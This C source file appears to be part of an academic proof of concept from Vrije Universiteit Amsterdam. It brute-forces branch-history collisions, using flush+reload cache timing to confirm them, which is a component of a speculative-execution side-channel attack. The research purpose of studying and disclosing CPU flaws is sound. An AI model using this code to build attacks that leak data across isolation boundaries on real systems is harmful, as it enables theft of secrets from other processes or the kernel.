/*
 * Friday, October 27th 2023
 *
 * Sander Wiebing - s.j.wiebing@vu.nl
 * Alvise de Faveri Tron - a.de.faveri.tron@vu.nl
 * Herbert Bos - herbertb@cs.vu.nl
 * Cristiano Giuffrida - giuffrida@cs.vu.nl
 *
 * Vrije Universiteit Amsterdam - Amsterdam, The Netherlands
 *
 */

#include "flush_and_reload.h"
#include "targets.h"
#include "../../poc-common/common.h"

#include <sys/prctl.h>
#include <sys/ioctl.h>

#include <sys/time.h>
#include <sys/resource.h>
#include <string.h>


// ----------------------------------------------------------------------------
// Colliding history finding with a static target history
//
// ----------------------------------------------------------------------------


int find_colliding_history(struct config * cfg, uint8_t do_pht_eviction) {

    uint64_t hits = 0;
    int iter = 0;

    set_load_chain_simple_touch(cfg, 1);

    cfg->reload_addr = cfg->fr_buf;

    while(1) {
        iter++;
        if((iter % 10000) == 0){
            printf("\rTries: %d", iter);
            fflush(stdout);

        }


        // randomize history
        for(int i=0; i<MAX_HISTORY_SIZE; i++) cfg->history[i] = rand()&1;

        // do test
        hits = do_flush_and_reload(cfg, 10, 0);

        if(hits > 1) {

            printf("\n>> Found collision in %d tries (%ld/10 hits)\n", iter, hits);

            hits = do_flush_and_reload(cfg, 10000, 0);

            printf("   Verification: %ld/10000 hits\n", hits);

            if (hits < 100) {
                continue;
            }

            printf("History:\n");

            for(int i=0; i<MAX_HISTORY_SIZE; i++) {
                printf("%c", cfg->history[i]+'0');
            }

            printf("\n-------\n");

            break;

        }

    }

}

int find_colliding_history_2stage(struct config * cfg) {

    uint64_t hits = 0;
    int iter = 0;


    set_load_chain_simple_touch_2stage(cfg, 2);

    cfg->reload_addr = cfg->fr_buf;


    while(1) {
        iter++;
        if((iter % 10000) == 0){
            printf("\rTries: %d", iter);
            fflush(stdout);
        }


        for(int i=0; i<MAX_HISTORY_SIZE; i++) cfg->history_second[i] = rand()&1;


        hits = do_flush_and_reload(cfg, 5, 0);


        if(hits > 0) {

            printf("\n>> Found collision in %d tries (%ld/10 hits)\n", iter, hits);

            hits = do_flush_and_reload(cfg, 10000, 0);

            printf("   Verification: %ld/10000 hits\n", hits);

            if (hits < 100) {
                continue;
            }

            set_load_chain_simple_touch_2stage(cfg, 1);
            hits = do_flush_and_reload(cfg, 10000, 0);

            if (hits > 5) {
                printf("Invalid collision: not a 2-stage chaining\n");
                continue;
            } else {
                printf("   Confirmed 2-stage collision! (%ld hits on dispatch touch)\n", hits);
            }


            printf("History:\n");

            for(int i=0; i<MAX_HISTORY_SIZE; i++) {
                printf("%c", cfg->history[i]+'0');
            }

            printf("\n-------\n");

            break;
        }

    }

}


